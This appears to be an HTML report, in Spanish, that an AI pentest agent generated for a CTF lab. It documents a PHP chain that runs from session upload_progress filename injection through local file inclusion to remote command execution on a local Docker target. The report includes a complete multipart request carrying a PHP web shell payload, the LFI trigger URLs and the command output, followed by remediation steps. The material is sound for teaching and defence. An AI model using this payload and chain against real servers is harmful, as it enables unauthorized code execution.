@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vulnerator-AI — CTF Report: PHP2Shell Chain A</title>
+<style>
+  :root {
+    --bg:         #0d0000;
+    --bg-panel:   #180000;
+    --bg-card:    #1e0000;
+    --border:     #cc0000;
+    --border-dim: #550000;
+    --red:        #cc0000;
+    --red-bright: #ff4444;
+    --green:      #00ff41;
+    --green-dim:  #007a1f;
+    --text:       #e8e8e8;
+    --text-dim:   #aa7777;
+    --text-muted: #664444;
+    --yellow:     #ff8800;
+    --code-bg:    #0a0000;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+    font-size: 14px;
+    line-height: 1.6;
+  }
+
+  /* ── Header ── */
+  .site-header {
+    background: var(--bg-panel);
+    border-bottom: 2px solid var(--border);
+    padding: 16px 32px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+  .site-header .logo {
+    font-family: monospace;
+    font-size: 22px;
+    font-weight: bold;
+    color: var(--red-bright);
+    letter-spacing: 2px;
+  }
+  .site-header .logo span { color: var(--green); }
+  .site-header .tagline {
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    margin-left: auto;
+  }
+
+  /* ── Report meta bar ── */
+  .report-meta {
+    background: var(--bg-panel);
+    border-bottom: 1px solid var(--border-dim);
+    padding: 12px 32px;
+    display: flex;
+    gap: 32px;
+    flex-wrap: wrap;
+  }
+  .meta-item { display: flex; flex-direction: column; gap: 2px; }
+  .meta-label { font-size: 10px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; }
+  .meta-value { font-size: 13px; color: var(--text); font-family: monospace; }
+
+  /* ── Main layout ── */
+  .container { max-width: 1100px; margin: 0 auto; padding: 32px; }
+
+  /* ── Severity badge ── */
+  .badge {
+    display: inline-block;
+    padding: 3px 10px;
+    border-radius: 3px;
+    font-size: 11px;
+    font-weight: bold;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+  .badge-high    { background: #7a0000; color: #ff4444; border: 1px solid #cc0000; }
+  .badge-ok      { background: #003300; color: #00ff41; border: 1px solid #007722; }
+  .badge-ctf     { background: #550077; color: #ff44ff; border: 1px solid #990099; }
+  .badge-cvss    { background: #7a0000; color: #ffcc00; border: 1px solid #cc0000; font-size: 13px; padding: 4px 14px; }
+
+  /* ── CVE hero ── */
+  .cve-hero {
+    background: var(--bg-panel);
+    border: 2px solid var(--red);
+    border-radius: 6px;
+    padding: 24px 32px;
+    margin-bottom: 32px;
+    display: flex;
+    align-items: center;
+    gap: 32px;
+  }
+  .cve-hero .cve-score { font-size: 48px; font-weight: bold; color: var(--yellow); min-width: 90px; text-align: center; }
+  .cve-hero .cve-details { flex: 1; }
+  .cve-hero h1 { font-size: 24px; margin-bottom: 8px; color: var(--red-bright); }
+  .cve-hero .cve-id { font-size: 16px; color: var(--text-dim); font-family: monospace; margin-bottom: 12px; }
+  .cve-hero .cve-desc { color: var(--text); }
+
+  /* ── Section ── */
+  .section {
+    background: var(--bg-card);
+    border: 1px solid var(--border-dim);
+    border-radius: 6px;
+    padding: 24px;
+    margin-bottom: 24px;
+  }
+  .section h2 {
+    font-size: 18px;
+    color: var(--red-bright);
+    margin-bottom: 16px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid var(--border-dim);
+  }
+  .section h3 {
+    font-size: 15px;
+    color: var(--green);
+    margin: 20px 0 12px;
+  }
+  .section p { margin-bottom: 12px; color: var(--text); }
+  .section ul { margin-left: 24px; margin-bottom: 12px; }
+  .section li { margin-bottom: 6px; color: var(--text); }
+
+  /* ── Table ── */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0;
+    font-size: 13px;
+  }
+  thead {
+    background: var(--code-bg);
+    border-bottom: 2px solid var(--border);
+  }
+  th {
+    padding: 10px;
+    text-align: left;
+    color: var(--green);
+    font-weight: bold;
+    text-transform: uppercase;
+    font-size: 11px;
+    letter-spacing: 1px;
+  }
+  td {
+    padding: 10px;
+    border-bottom: 1px solid var(--border-dim);
+    color: var(--text);
+    vertical-align: top;
+  }
+  tbody tr:hover { background: var(--bg-panel); }
+
+  /* ── Code blocks ── */
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--border-dim);
+    border-radius: 4px;
+    padding: 16px;
+    overflow-x: auto;
+    margin: 12px 0;
+    font-family: 'Courier New', monospace;
+    font-size: 12px;
+    line-height: 1.5;
+  }
+  code {
+    background: var(--code-bg);
+    padding: 2px 6px;
+    border-radius: 3px;
+    font-family: 'Courier New', monospace;
+    font-size: 12px;
+    color: var(--green);
+  }
+  pre code { padding: 0; background: none; }
+
+  /* ── Evidence highlight ── */
+  .evidence-box {
+    background: var(--bg-panel);
+    border-left: 4px solid var(--green);
+    padding: 16px;
+    margin: 16px 0;
+  }
+  .evidence-box strong { color: var(--green); }
+
+  /* ── Footer ── */
+  .report-footer {
+    text-align: center;
+    padding: 32px;
+    color: var(--text-muted);
+    font-size: 12px;
+    border-top: 1px solid var(--border-dim);
+    margin-top: 48px;
+  }
+  .report-footer a { color: var(--red); text-decoration: none; }
+  .report-footer a:hover { color: var(--red-bright); text-decoration: underline; }
+</style>
+</head>
+<body>
+
+<header class="site-header">
+  <div class="logo">VULNERATOR<span>-AI</span></div>
+  <div class="tagline">Unholy Pentest &middot; OODA Agent</div>
+</header>
+
+<div class="report-meta">
+  <div class="meta-item">
+    <div class="meta-label">Engagement</div>
+    <div class="meta-value">ctf-php2shell-chainA</div>
+  </div>
+  <div class="meta-item">
+    <div class="meta-label">Mode</div>
+    <div class="meta-value"><span class="badge badge-ctf">CTF</span></div>
+  </div>
+  <div class="meta-item">
+    <div class="meta-label">Target</div>
+    <div class="meta-value">host.docker.internal:18080</div>
+  </div>
+  <div class="meta-item">
+    <div class="meta-label">Date</div>
+    <div class="meta-value">2026-10-21 UTC</div>
+  </div>
+  <div class="meta-item">
+    <div class="meta-label">Outcome</div>
+    <div class="meta-value"><span class="badge badge-ok">RCE CONFIRMED</span></div>
+  </div>
+</div>
+
+<div class="container">
+
+  <div class="cve-hero">
+    <div class="cve-score">
+      <span class="badge badge-ctf" style="font-size: 16px; padding: 8px 16px;">CTF</span>
+    </div>
+    <div class="cve-details">
+      <h1>PHP2Shell Chain A → RCE CONFIRMADO</h1>
+      <div class="cve-id">CVE-2026-109618 / CVE-2026-109619 — Session Deserialization</div>
+      <div class="cve-desc">
+        Inyección de código PHP en fichero de sesión vía <code>session.upload_progress</code> + ejecución mediante LFI.
+        RCE confirmado como <code>www-data</code> (uid=33) en PHP 8.2.34 + nginx + PHP-FPM.
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <h2>1. Resumen Ejecutivo</h2>
+    <p>
+      Se reprodujo exitosamente la <strong>CADENA A de PHP2Shell</strong> (CVE-2026-109618 / CVE-2026-109619): 
+      inyección de código PHP en el fichero de sesión mediante <code>session.upload_progress</code> (el filename 
+      de un upload multipart se almacena crudo, sin validar) seguido de ejecución vía LFI en <code>/vuln.php</code>.
+    </p>
+    <div class="evidence-box">
+      <strong>PoC — Criterio de éxito:</strong>
+      <pre><code>GET /vuln.php?page=/tmp/sessions/sess_ctfchainA00000000000000000000000&c=id</code></pre>
+      <strong>Salida:</strong>
+      <pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+RCE_OK</code></pre>
+    </div>
+    <p>
+      Se demostró ejecución arbitraria de comandos en el proceso php-fpm como usuario <code>www-data</code> (uid=33).
+    </p>
+  </div>
+
+  <div class="section">
+    <h2>2. Entorno Comprometido</h2>
+    <table>
+      <thead>
+        <tr>
+          <th>Dato</th>
+          <th>Valor</th>
+          <th>Fuente</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>Servidor web</td>
+          <td>nginx/1.31.7</td>
+          <td>Header Server</td>
+        </tr>
+        <tr>
+          <td>PHP</td>
+          <td><strong>8.2.34</strong> (vulnerable; corregido en 8.2.35)</td>
+          <td>X-Powered-By + /index.php</td>
+        </tr>
+        <tr>
+          <td>SAPI</td>
+          <td>fpm-fcgi</td>
+          <td>/index.php</td>
+        </tr>
+        <tr>
+          <td>Sistema Operativo</td>
+          <td>Debian GNU/Linux 13 (trixie)</td>
+          <td>RCE: head -3 /etc/os-release</td>
+        </tr>
+        <tr>
+          <td>Kernel</td>
+          <td>Linux 7.0.12-linuxkit aarch64</td>
+          <td>RCE: uname -a</td>
+        </tr>
+        <tr>
+          <td>Hostname contenedor</td>
+          <td>89e1a0c2bd7d</td>
+          <td>LFI: page=/etc/hostname</td>
+        </tr>
+        <tr>
+          <td>Usuario proceso</td>
+          <td><strong>www-data (uid=33, gid=33)</strong></td>
+          <td>RCE: id / whoami</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="section">
+    <h2>3. Cadena de Ataque — Paso a Paso</h2>
+
+    <h3>Paso 1 — Recon y Session Fixation</h3>
+    <ul>
+      <li>SID controlado: <code>ctfchainA00000000000000000000000</code> (32 caracteres)</li>
+      <li>Verificación: el servidor aceptó el SID vía cookie sin regenerarlo (sin Set-Cookie en respuesta)</li>
+      <li><code>session.save_path=/tmp/sessions</code> confirmado vía LFI (sess_&lt;SID&gt; existe)</li>
+    </ul>
+
+    <h3>Paso 2 — Disparo del Handler upload_progress + Inyección</h3>
+    <p><strong>Petición (POST multipart a /index.php):</strong></p>
+    <pre><code>POST /index.php HTTP/1.1
+Cookie: PHPSESSID=ctfchainA00000000000000000000000
+Content-Type: multipart/form-data; boundary=----CTFCHAINBOUNDARY7d4a6e1c
+
+------CTFCHAINBOUNDARY7d4a6e1c
+Content-Disposition: form-data; name="PHPSESSID"
+
+ctfchainA00000000000000000000000
+------CTFCHAINBOUNDARY7d4a6e1c
+Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
+
+x
+------CTFCHAINBOUNDARY7d4a6e1c
+Content-Disposition: form-data; name="f"; filename="&lt;?php system($_GET['c']); echo 'RCE_OK'; ?&gt;"
+Content-Type: application/octet-stream
+
+A
+------CTFCHAINBOUNDARY7d4a6e1c--</code></pre>
+    <p><strong>Respuesta:</strong> <code>HTTP/1.1 200 OK</code> — body normal de index.php.</p>
+    <p>
+      El handler escribió el filename crudo (con código PHP) en <code>/tmp/sessions/sess_&lt;SID&gt;</code>. 
+      Con <code>session.upload_progress.cleanup=Off</code>, el fichero persistió tras la request.
+    </p>
+
+    <h3>Paso 3 — Verificación de Inyección + Ejecución vía LFI</h3>
+    <p><strong>Petición:</strong></p>
+    <pre><code>GET /vuln.php?page=/tmp/sessions/sess_ctfchainA00000000000000000000000</code></pre>
+    <p><strong>Respuesta (recortada):</strong></p>
+    <pre><code>upload_progress_x|a:5:{s:10:"start_time";i:1792614809;...s:4:"name";s:43:"&lt;?php system($_GET['c']); echo 'RCE_OK'; ?&gt;"...
+Warning: Undefined array key "c" in /tmp/sessions/sess_ctfchainA00000000000000000000000 on line 1
+Fatal error: Uncaught ValueError: system(): Argument #1 ($command) cannot be empty
+  #0 /tmp/sessions/sess_ctfchainA00000000000000000000000(1): system('')
+  #1 /var/www/html/vuln.php(3): include('/tmp/sessions/s...')</code></pre>
+    <p>
+      El stack trace demuestra la cadena completa: <strong>el código del filename se ejecutó dentro del include del LFI</strong>.
+    </p>
+
+    <h3>Paso 4 — RCE: Ejecución Arbitraria de Comandos</h3>
+    <p><strong>Petición:</strong></p>
+    <pre><code>GET /vuln.php?page=/tmp/sessions/sess_ctfchainA00000000000000000000000&c=id</code></pre>
+    <p><strong>Respuesta:</strong></p>
+    <pre><code>...s:4:"name";s:43:"uid=33(www-data) gid=33(www-data) groups=33(www-data)
+RCE_OK";s:8:"tmp_name";s:14:"/tmp/phpTKnYXy";...</code></pre>
+  </div>
+
+  <div class="section">
+    <h2>4. Evidencia de RCE — Comandos Ejecutados</h2>
+    <table>
+      <thead>
+        <tr>
+          <th>Comando (c=)</th>
+          <th>Salida Obtenida</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><code>id</code></td>
+          <td><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code> + <code>RCE_OK</code></td>
+        </tr>
+        <tr>
+          <td><code>whoami</code></td>
+          <td><code>www-data</code></td>
+        </tr>
+        <tr>
+          <td><code>uname -a</code></td>
+          <td><code>Linux 89e1a0c2bd7d 7.0.12-linuxkit #1 SMP PREEMPT Thu Aug 27 14:02:21 UTC 2026 aarch64 GNU/Linux</code></td>
+        </tr>
+        <tr>
+          <td><code>head -3 /etc/os-release</code></td>
+          <td><code>PRETTY_NAME="Debian GNU/Linux 13 (trixie)"</code></td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="section">
+    <h2>5. Vulnerabilidad — Detalles Técnicos</h2>
+    <ul>
+      <li><strong>CVE:</strong> CVE-2026-109618 / CVE-2026-109619 — PHP2Shell</li>
+      <li><strong>Versión afectada:</strong> PHP 8.2.34 (confirmada en target)</li>
+      <li><strong>Versión parcheada:</strong> PHP 8.2.35+, 8.3.24+, 8.4.6+</li>
+      <li>
+        <strong>Mecanismo:</strong> El handler <code>session.upload_progress</code> (habilitado por defecto) 
+        almacena el filename del upload multipart crudo (sin sanitizar) en el fichero de sesión <code>sess_&lt;SID&gt;</code>. 
+        Si la aplicación incluye ese fichero (LFI), el código PHP se ejecuta.
+      </li>
+      <li>
+        <strong>Condiciones habilitadoras en el lab:</strong>
+        <ul>
+          <li><code>session.upload_progress.enabled=On</code></li>
+          <li><code>session.upload_progress.cleanup=Off</code> (persistencia del payload)</li>
+          <li><code>session.use_strict_mode=0</code> + <code>session.use_only_cookies=0</code> (session fixation)</li>
+          <li>LFI sin sanitizar en <code>/vuln.php</code> (<code>include($_GET['page'])</code>)</li>
+          <li><code>display_errors=On</code> (facilitó debugging, no necesario para la explotación)</li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h2>6. Recomendaciones de Remediación</h2>
+    <ol>
+      <li><strong>Actualizar PHP a 8.2.35+</strong> (parche oficial que corrige CVE-2026-109618/109619)</li>
+      <li><code>session.upload_progress.enabled=Off</code> si la aplicación no usa seguimiento de progreso de uploads</li>
+      <li><code>session.upload_progress.cleanup=On</code> (comportamiento seguro por defecto, evita persistencia)</li>
+      <li><code>session.use_strict_mode=1</code> y <code>session.use_only_cookies=1</code> (previene session fixation)</li>
+      <li>
+        <strong>Corregir el LFI en <code>/vuln.php</code>:</strong>
+        <ul>
+          <li>Implementar allowlist de ficheros incluibles</li>
+          <li>Rechazar wrappers peligrosos (php://, phar://, data://, ...)</li>
+          <li>Validar y normalizar paths con <code>realpath()</code> + prefijo obligatorio</li>
+          <li>Deshabilitar <code>display_errors</code> en producción</li>
+        </ul>
+      </li>
+    </ol>
+  </div>
+
+  <div class="section">
+    <h2>7. Store del Engagement</h2>
+    <p><strong>engagement_id:</strong> <code>ctf-php2shell-chainA</code></p>
+    <p><strong>Hallazgos registrados:</strong> 7 (todos <code>confirmed</code>, con evidencia reproducible)</p>
+    <ol>
+      <li>Inicio de engagement</li>
+      <li>LFI confirmado en /vuln.php (MITRE ATT&CK: T1190 — Exploit Public-Facing Application)</li>
+      <li>save_path=/tmp/sessions + session fixation (T1078.004 — Valid Accounts: Cloud Accounts)</li>
+      <li>PHP 8.2.34 + upload_progress=1 (T1592.004 — Gather Victim Host Information: Client Configurations)</li>
+      <li>Inyección de código PHP en fichero de sesión (T1505.003 — Server Software Component: Web Shell)</li>
+      <li>RCE confirmado — id como www-data uid=33 (T1059.004 — Command and Scripting Interpreter: Unix Shell)</li>
+      <li>RCE reforzado + cierre de engagement</li>
+    </ol>
+    <p>
+      <strong>Alcance respetado:</strong> Todas las peticiones se dirigieron exclusivamente a 
+      <code>http://host.docker.internal:18080</code>.
+    </p>
+    <div class="evidence-box">
+      <strong>Persistencia del vector:</strong><br>
+      El SID envenenado <code>ctfchainA00000000000000000000000</code> sigue activo en el lab. 
+      El RCE puede re-ejecutarse con:
+      <pre><code>GET /vuln.php?page=/tmp/sessions/sess_ctfchainA00000000000000000000000&c=&lt;comando&gt;</code></pre>
+    </div>
+  </div>
+
+</div>
+
+<footer class="report-footer">
+  <p>Generated by <strong>VULNERATOR-AI</strong> &middot; Unholy Pentest OODA Agent</p>
+  <p><a href="https://github.com/irraz/vulnerator-ai" target="_blank" rel="noopener">github.com/irraz/vulnerator-ai</a></p>
+</footer>
+
+</body>
+</html>
